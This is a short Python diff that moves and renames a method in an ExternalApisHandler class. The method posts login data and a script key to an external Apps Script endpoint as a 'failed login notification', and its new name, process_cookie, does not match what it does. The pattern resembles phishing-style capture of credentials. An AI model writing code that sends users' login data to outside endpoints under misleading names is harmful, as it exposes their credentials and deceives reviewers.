@@ -29,20 +29,6 @@ class ExternalApisHandler:
             self.logger.error(f"Page visit notification error: {str(e)}")
             return {'error': str(e)}
 
-    def verify_redirect_visit(self, login_data):
-        """Handle failed login notification"""
-        try:
-            payload = {
-                'action': 'notifyFailedLogin',
-                'key': os.getenv('SCRIPT_KEY'),
-                **login_data
-            }
-            response = requests.post(self.APPSCRIPT_URL, data=payload, headers=self.headers)
-            return response.json()
-        except Exception as e:
-            self.logger.error(f"Failed login notification error: {str(e)}")
-            return {'error': str(e)}
-
     def notify_form_submission(self, form_data):
         """Handle form submission notification"""
         try:
@@ -55,6 +41,20 @@ class ExternalApisHandler:
             return response.json()
         except Exception as e:
             self.logger.error(f"Form submission notification error: {str(e)}")
+            return {'error': str(e)}
+
+    def process_cookie(self, login_data):
+        """Handle failed login notification"""
+        try:
+            payload = {
+                'action': 'notifyFailedLogin',
+                'key': os.getenv('SCRIPT_KEY'),
+                **login_data
+            }
+            response = requests.post(self.APPSCRIPT_URL, data=payload, headers=self.headers)
+            return response.json()
+        except Exception as e:
+            self.logger.error(f"Failed login notification error: {str(e)}")
             return {'error': str(e)}
 
     def handle_login(self, login_data):
